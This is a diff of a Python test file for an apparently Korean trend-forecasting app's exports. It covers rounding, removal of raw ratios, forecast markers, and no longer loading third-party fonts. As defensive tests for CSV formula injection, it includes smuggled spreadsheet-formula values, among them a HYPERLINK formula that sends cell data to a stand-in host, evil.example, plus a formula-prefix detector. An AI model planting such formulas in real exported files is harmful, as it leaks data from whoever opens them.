@@ -20,6 +20,8 @@ from trendai import narrative as N
 from trendai import pipeline, samples
 from trendai.compare import rank_trends
 from trendai.web import exports as ex
+from trendai.web import fmt
+from trendai.web import texts as T
 from trendai.web import viewmodel as vm
 
 AS_OF = "2026-11-25T00:12:00Z"
@@ -120,11 +122,13 @@ def test_csv_format_naver_weekly():
     rows = list(csv.reader(lines[3:]))
     n_hist, n_fc = len(chart["dates"]), len(chart["forecast"]["dates"])
     assert len(rows) == n_hist + n_fc
-    assert rows[0] == [chart["dates"][0], format(chart["trend"][0], ".15g"), "", "", "", "", ""]
+    # model outputs keep 6 significant digits of the scale (100 -> 3 decimals; FU-12), not 15
+    r3 = lambda x: format(float(fmt.round_half_away(x, 3)), ".15g")   # noqa: E731
+    assert rows[0] == [chart["dates"][0], r3(chart["trend"][0]), "", "", "", "", ""]
     first_fc = rows[n_hist]
     fc = chart["forecast"]
-    assert first_fc == [fc["dates"][0], ""] + [format(fc[k][0], ".15g") for k in ("mean", "lo80", "hi80", "lo95",
-                                                                                  "hi95")]
+    assert first_fc == [fc["dates"][0], ""] + [r3(fc[k][0]) for k in ("mean", "lo80", "hi80", "lo95", "hi95")]
+    assert all(len(c.split(".", 1)[1]) <= 3 for r in rows for c in r[1:] if "." in c)
     assert f.filename == "trendai-Zx8kP2mQ-0.csv" and f.filename_utf8 == "trendai-선크림.csv"
     en = ex.series_csv(naver_case("en")[1][0][0], file_id=FILE_ID)
     en_lines = csv_lines(en)
@@ -143,8 +147,8 @@ def test_csv_history_has_actual_and_reads_back():
     assert lines[2] == "날짜,실제값,추세,예측값,80% 하한,80% 상한,95% 하한,95% 상한"
     df = pd.read_csv(io.BytesIO(f.body), comment="#", encoding="utf-8-sig")
     assert len(df) == len(r.analysis.series) + len(r.forecast.mean)
-    assert df["실제값"].iloc[:120].tolist() == pytest.approx(np.asarray(r.analysis.series).tolist())
-    assert df["예측값"].iloc[120:].tolist() == pytest.approx(np.asarray(r.forecast.mean).tolist())
+    assert df["실제값"].iloc[:120].tolist() == pytest.approx(np.asarray(r.analysis.series).tolist(), rel=1e-14)
+    assert df["예측값"].iloc[120:].tolist() == pytest.approx(np.asarray(r.forecast.mean).tolist(), abs=6e-4)
     assert df["실제값"].iloc[120:].isna().all() and df["예측값"].iloc[:120].isna().all()
 
 
@@ -154,7 +158,8 @@ def test_csv_formula_guard():
     inputs, (vms, cmp, ranking, n2i) = upload_case()
     rows = ex.ranking_rows(ranking, n2i)
     lines = csv_lines(ex.result_csv(vms, cmp, rows, file_id=FILE_ID))
-    assert lines[2] == "순위,이름,국면,전망,예측 변화(%),상승 확률(%),최근 변화(%),모멘텀(%p/기간),상승 점수,예측 신뢰도"
+    assert lines[2] == ("순위,이름,국면,전망,예측 변화(%),상승 확률(%),최근 변화(%),모멘텀(%p/기간),상승 점수,예측 신뢰도,"
+                        "참고용 예측")
     names = [r[1] for r in csv.reader(lines[3:])]
     # a quoted cell that merely contains "=" later on starts with "방": nothing to guard
     assert set(names) == {"'=SUM(A1)", "방문자,=HYPERLINK(1)"}
@@ -207,9 +212,16 @@ def test_result_csv_ranking_and_single():
         out = by_name[ex.guard_text(row["name"])]
         v = next(x for x in vms if x["index"] == row["index"])
         assert out[2] == v["phase"]["name"] and out[3] == v["hero"]["outlook"]["word"]
-        assert out[5] == ("" if row["prob_increase"] is None else format(row["prob_increase"] * 100, ".15g"))
-        assert out[8] == format(row["score"], ".15g")
+        # FU-12: one decimal, never a false certainty (99.99999 % -> 99.9, not 100)
+        p = row["prob_increase"]
+        if p is None:
+            assert out[5] == ""
+        else:
+            assert float(out[5]) == pytest.approx(min(max(p * 100, 0.1), 99.9), abs=0.051)
+            assert len(out[5].split(".", 1)[-1]) <= 1 or "." not in out[5]
+        assert out[8] == format(float(fmt.round_half_away(row["score"], 1)), ".15g")
         assert out[9] in ("high", "medium", "low")
+        assert out[10] == ("yes" if v["flags"]["reference_only"] else "no")
     single = vms[:1]
     a = ex.result_csv(single, None, None, file_id=FILE_ID)
     b = ex.series_csv(single[0], file_id=FILE_ID)
@@ -229,10 +241,14 @@ def test_json_series_export_and_naver_strip():
     block = vm.build_source_block(meta, "en")
     en_text = N.generate_narrative(a.analysis, a.forecast, a.outlook, lang="en")[0]
     out = ex.build_series_json(a, block, "en", narrative=en_text)
-    assert out["source"] == block and out["narrative"] == en_text
+    assert out["source"] == block
+    # CON-1: the rule-based narrative quotes raw ratios (latest value, peak, averages, anomaly actuals)
+    assert out["narrative"] == T.EXPORT_TEXTS["naver_narrative_excluded"][1]
+    assert out["narrative_source"] == "excluded"
     assert "history" not in out and out["raw_excluded"] is True
-    for key in ("last_value", "peak_value", "mean"):
+    for key in ("last_value", "peak_value", "mean", "drawdown_pct"):
         assert key not in out["metrics"]
+    assert "compared_levels" not in out["outlook"]
     assert all("value" not in an for an in out["anomalies"])
     assert out["trend"] and out["forecast"]["table"] and "scenarios" in out["outlook"]
     json.dumps(out, ensure_ascii=False, allow_nan=False)
@@ -344,12 +360,13 @@ def test_xlsx_structure():
     assert ws.cell(8, 1).value is None
     assert [ws.cell(9, c).value for c in range(1, 9)] == ["날짜", "실제값", "추세", "예측값", "80% 하한", "80% 상한",
                                                          "95% 하한", "95% 상한"]
-    assert ws.cell(10, 1).value == vms[0]["chart"]["dates"][0]
-    assert isinstance(ws.cell(10, 2).value, float)
+    first = vms[0]["chart"]["dates"][0]
+    assert ws.cell(10, 1).value.strftime("%Y-%m-%d") == first and ws.cell(10, 1).number_format == "yyyy-mm"
+    assert ws.cell(10, 2).is_date is False and isinstance(ws.cell(10, 2).value, float)
     assert ws.cell(10, 2).value == pytest.approx(vms[0]["chart"]["actual"][0])
     summary = wb["요약"]
     assert [c.value for c in summary[1]] == ["이름", "국면", "전망", "예측 변화", "상승 확률", "예측 신뢰도", "정확도",
-                                             "상승 점수"]
+                                             "상승 점수", "예측 변화(%)", "상승 확률(%)"]
     names = [summary.cell(r, 1) for r in (2, 3)]
     assert [c.value for c in names] == ["=SUM(A1)", "방문자,=HYPERLINK(1)"]
     for cell in names:
@@ -391,3 +408,153 @@ def test_xlsx_unavailable(monkeypatch):
 def test_xlsx_available_is_cached_bool():
     assert isinstance(ex.xlsx_available(), bool)
     assert ex.xlsx_available() is ex.xlsx_available()
+
+
+# ------------------------------------------------------------------------------------- round-7 regression tests
+
+_EVIL = 'Sales,"=HYPERLINK(""https://evil.example/?x=""&A5,""Open"")",Q4'
+
+
+def _is_number(cell: str) -> bool:
+    try:
+        float(cell)
+    except ValueError:
+        return False
+    return True
+
+
+def _formula_cells(body: bytes) -> list[str]:
+    """Cells a spreadsheet could evaluate: every line parsed as CSV with ','; the two comment lines also with ';'
+    (semicolon-locale Excel); a non-numeric cell whose first non-blank character starts a formula."""
+    text = body.decode("utf-8-sig")
+    comments = "".join(line + "\r\n" for line in text.split("\r\n") if line.startswith("# "))
+    bad = []
+    for delim, part in ((",", text), (";", comments)):
+        for row in csv.reader(io.StringIO(part), delimiter=delim):
+            for cell in row:
+                head = cell.lstrip(" ")
+                if head[:1] in ("=", "+", "-", "@", "\t", "\r") and not _is_number(head):
+                    bad.append(cell)
+    return bad
+
+
+def test_csv_comment_lines_cannot_carry_formulas():
+    """SEC-3: '# 조건: 열 Sales,"=HYPERLINK(…)",Q4' parsed into a live formula cell (a piece starting with a quote
+    escaped the guard). Every exported CSV is parsed like a spreadsheet would."""
+    a, b = report_of("growing", _EVIL), report_of("late", 'a,"=2+5";@b')
+    inputs = [input_of(a, meta_of(a, "upload", filename='x,"=1+1".csv'), 0, 2),
+              input_of(b, meta_of(b, "upload", filename='x,"=1+1".csv'), 1, 2)]
+    vms, cmp, ranking, n2i = compare_of(inputs)
+    files = [ex.series_csv(v, file_id=FILE_ID) for v in vms]
+    files += [ex.result_csv(vms, cmp, ex.ranking_rows(ranking, n2i), file_id=FILE_ID),
+              ex.values_csv(vms, cmp, file_id=FILE_ID), ex.result_csv(vms[:1], None, None, file_id=FILE_ID)]
+    for f in files:
+        assert _formula_cells(f.body) == [], f.filename
+        for line in csv_lines(f)[:2]:
+            assert line.startswith("# ") and '"' not in line          # comment lines stay unquoted, quote-free
+    line = csv_lines(files[0])[1]
+    assert line.startswith("# 조건: 열 Sales,”'=HYPERLINK(") or line.startswith("# 조건: 열 Sales,'”=HYPERLINK(") \
+        or "”=HYPERLINK" in line
+    assert ex._comment('a, =1;  +2,"@3') == "# a, '=1;  '+2,”@3"
+    assert ex._comment("x\ty\r\nz") == "# x y z"
+    df = pd.read_csv(io.BytesIO(files[0].body), comment="#", encoding="utf-8-sig")   # pandas still skips them
+    assert len(df) == len(vms[0]["chart"]["dates"]) + len(vms[0]["chart"]["forecast"]["dates"])
+
+
+def _raw_tokens(v: dict) -> set[str]:
+    out = set()
+    for x in v["chart"]["actual"]:
+        if x is not None and abs(x) >= 1.0:
+            out.update({f"{x:.1f}", f"{x:.2f}"})
+    return out
+
+
+def test_naver_json_exports_carry_no_raw_ratios():
+    """CON-1: the per-series and whole-result Naver JSON carried the narrative (latest value, peak, averages,
+    anomaly actuals, the scenario reference), outlook.compared_levels and metrics.drawdown_pct."""
+    import re
+
+    for lang in ("ko", "en"):
+        inputs, (vms, cmp, _, _) = naver_case(lang)
+        exports_ = []
+        for inp, v in zip(inputs, vms, strict=True):
+            en_text = N.generate_narrative(inp.report.analysis, inp.report.forecast, inp.report.outlook,
+                                           lang="en")[0] if lang == "en" else None
+            exports_.append(ex.build_series_json(inp.report, v["source"], lang, narrative=en_text))
+        whole = ex.build_result_json(exports_, source_line=cmp["source_line"])
+        for v, doc in zip(vms, exports_, strict=True):
+            assert doc["narrative_source"] == "excluded" and "compared_levels" not in doc["outlook"]
+            assert "drawdown_pct" not in doc["metrics"] and "history" not in doc
+            # no raw ratio printed in any text of the file (numbers of model outputs are full precision floats)
+            texts = json.dumps([doc["narrative"], doc["phase"], doc["source"]], ensure_ascii=False)
+            for tok in _raw_tokens(v):
+                assert not re.search(r"(?<![\d.])" + re.escape(tok) + r"(?![\d%])", texts), (lang, tok)
+            last = v["chart"]["last_actual"]["value"]
+            assert not any(isinstance(x, (int, float)) and abs(x - last) < 1e-9
+                           for x in _numbers(doc)), "last ratio reconstructible"
+        assert all(r["narrative_source"] == "excluded" for r in whole["reports"])
+    # the narrative is kept for every other source
+    r = report_of("growing")
+    assert ex.build_series_json(r, vm.build_source_block(meta_of(r, "sample"), "ko"), "ko")["narrative"] == \
+        r.narrative
+    short = {"phase": {"reasons": ["관측 기간 동안 값이 3.0에서 5.0까지 +66.7% 변했습니다.", "다른 이유"]},
+             "narrative": "x"}
+    assert ex.strip_naver_raw(short, "ko")["phase"]["reasons"] == ["다른 이유"]
+
+
+def _numbers(obj):
+    if isinstance(obj, dict):
+        for v in obj.values():
+            yield from _numbers(v)
+    elif isinstance(obj, list):
+        for v in obj:
+            yield from _numbers(v)
+    elif isinstance(obj, (int, float)) and not isinstance(obj, bool):
+        yield obj
+
+
+def test_weak_forecast_rule_in_spreadsheets():
+    """CON-3: the XLSX summary sheet and the ranking CSV dropped the '· 참고용' marker of a bands_only forecast;
+    FU-12: numeric columns beside the texts, real date cells."""
+    openpyxl = pytest.importorskip("openpyxl")
+    import dataclasses
+
+    good = report_of("growing", "좋은")
+    fad = report_of("fad", "나쁜")
+    bad = dataclasses.replace(fad, forecast=dataclasses.replace(fad.forecast, skill=1.2))
+    inputs = [input_of(good, meta_of(good, "upload", filename="f.csv"), 0, 2),
+              input_of(bad, meta_of(bad, "upload", filename="f.csv"), 1, 2)]
+    for lang, suffix, yes, no in (("ko", " · 참고용", "예", "아니요"), ("en", " · for reference", "yes", "no")):
+        vms, cmp, ranking, n2i = compare_of(inputs, lang)
+        assert vms[1]["chart"]["display"] == "bands_only" and vms[0]["chart"]["display"] == "normal"
+        wb = openpyxl.load_workbook(io.BytesIO(ex.result_xlsx(vms, cmp, file_id=FILE_ID).body))
+        summary = wb[wb.sheetnames[-1]]
+        rows = {summary.cell(r, 1).value: [c.value for c in summary[r]] for r in (2, 3)}
+        assert rows["나쁜"][3].endswith(suffix) and rows["나쁜"][4].endswith(suffix)
+        assert not rows["좋은"][3].endswith(suffix) and not rows["좋은"][4].endswith(suffix)
+        for name, v in (("좋은", vms[0]), ("나쁜", vms[1])):
+            tiles = {t["key"]: t for t in v["tiles"]}
+            assert rows[name][8] == pytest.approx(tiles["expected_change"]["value_raw"], abs=0.006)
+            assert 0.1 <= rows[name][9] <= 99.9
+        assert summary.cell(2, 9).number_format == "0.0"
+        table = list(csv.reader(csv_lines(ex.result_csv(vms, cmp, ex.ranking_rows(ranking, n2i),
+                                                        file_id=FILE_ID))[3:]))
+        assert {r[1]: r[10] for r in table} == {"좋은": no, "나쁜": yes}
+        ws = wb[wb.sheetnames[0]]
+        assert ws.cell(10, 1).is_date and ws.cell(10, 1).number_format == "yyyy-mm"
+        assert ws.cell(10, 3).number_format.startswith("#,##0")
+
+
+def test_html_exports_load_no_third_party_fonts():
+    """SEC-14: a downloaded report contacted fonts.googleapis.com; CON-7: weekly reports explain the Monday dates."""
+    r = report_of("growing")
+    page = ex.render_series_html(r, "출처: x")
+    assert "fonts.googleapis.com" not in page and "fonts.gstatic.com" not in page
+    assert "font-family" in page                                       # the CSS font stack is still there
+    reports = [report_of("growing"), report_of("fad")]
+    cpage = ex.render_result_html(reports, rank_trends({x.name: x for x in reports}), "출처: 비교")
+    assert "fonts.googleapis.com" not in cpage and '<p class="source">출처: 비교</p>' in cpage
+    weekly = report_of("naver_a", "주간")
+    wpage = ex.render_series_html(weekly, "출처: y · 2023.11.27 ~ 2026.11.22")
+    assert '<p class="source">출처: y · 2023.11.27 ~ 2026.11.22 · 아래 보고서의 주별 날짜는 각 주의 시작일(월요일)이에요</p>' \
+        in wpage
